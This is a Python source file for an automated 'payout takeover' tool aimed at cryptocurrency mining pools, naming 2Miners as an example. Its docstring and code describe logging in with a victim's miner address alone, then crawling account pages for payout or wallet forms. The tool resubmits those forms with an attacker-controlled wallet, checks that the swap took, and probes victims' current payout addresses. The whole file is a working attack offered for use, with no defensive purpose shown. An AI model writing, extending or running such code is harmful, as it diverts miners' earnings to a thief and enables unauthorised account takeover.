"""Payout takeover driver.

Pools like 2Miners authenticate with the miner address alone, so a discovered
target can be taken over with no credential. We warm cookies, log in, walk the
account pages, locate the form holding the payout field, replay every field
with our wallet substituted, then re-read the page to confirm.
"""
import re
import httpx
from bs4 import BeautifulSoup

UA = ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
      "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1")
PAY = re.compile(r"payout|wallet|address|addr|account", re.I)
SKIP = {"submit", "button", "file", "reset", "image"}

def _forms(html):
    soup = BeautifulSoup(html, "html.parser")
    out = []
    for f in soup.find_all("form"):
        names = [i.get("name") or "" for i in f.find_all(["input", "select", "textarea"])]
        if any(PAY.search(n) for n in names):
            out.append(f)
    return out

def _payload(form, new_addr):
    data = {}
    for i in form.find_all(["input", "select", "textarea"]):
        n = i.get("name")
        if not n:
            continue
        t = (i.get("type") or "text").lower()
        if t in SKIP:
            continue
        if t in ("checkbox", "radio") and not i.has_attr("checked"):
            continue
        if i.name == "select":
            o = i.find("option", selected=True) or i.find("option")
            if o is not None:
                data[n] = o.get("value") or o.text.strip()
            continue
        data[n] = i.get("value") or ""
    for n in list(data):
        if PAY.search(n):
            data[n] = new_addr
    return data

def current_payout(html):
    soup = BeautifulSoup(html, "html.parser")
    for i in soup.find_all("input"):
        n = (i.get("name") or "")
        if re.search(r"payout|wallet", n, re.I):
            return (i.get("value") or "").strip()
    return ""

async def takeover(spec, miner, new_addr, log):
    base = "https://" + spec["host"]
    headers = {"User-Agent": UA, "Accept-Language": "en"}
    async with httpx.AsyncClient(headers=headers, follow_redirects=True, timeout=30) as c:
        try:
            await c.get(base + "/")
        except Exception as e:
            return "fail", f"warmup:{type(e).__name__}"
        for field in ("login", "address", "wallet", "account"):
            try:
                await c.post(base + spec["login"], data={field: miner})
            except Exception:
                continue
        pages = ["/account", "/account/settings", "/settings", "/account/payout"]
        for p in pages:
            try:
                r = await c.get(base + p)
            except Exception:
                continue
            if r.status_code >= 400 or miner.lower() not in r.text.lower():
                continue
            for f in _forms(r.text):
                action = f.get("action") or p
                url = action if action.startswith("http") else base + action
                method = (f.get("method") or "post").lower()
                data = _payload(f, new_addr)
                try:
                    if method == "post":
                        rr = await c.post(url, data=data)
                    else:
                        rr = await c.get(url, params=data)
                except Exception as e:
                    log(f"submit {url}: {type(e).__name__}")
                    continue
                if new_addr.lower() in rr.text.lower():
                    return "ok", f"swap applied on {url}"
            try:
                v = await c.get(base + "/account")
                if new_addr.lower() in v.text.lower():
                    return "ok", f"swap verified from {p}"
            except Exception:
                pass
        return "fail", "no payout form reachable"

async def probe(spec, miner):
    base = "https://" + spec["host"]
    async with httpx.AsyncClient(headers={"User-Agent": UA}, follow_redirects=True, timeout=30) as c:
        try:
            await c.get(base + "/")
            for field in ("login", "address", "wallet"):
                await c.post(base + spec["login"], data={field: miner})
            r = await c.get(base + "/account")
            return current_payout(r.text)
        except Exception:
            return ""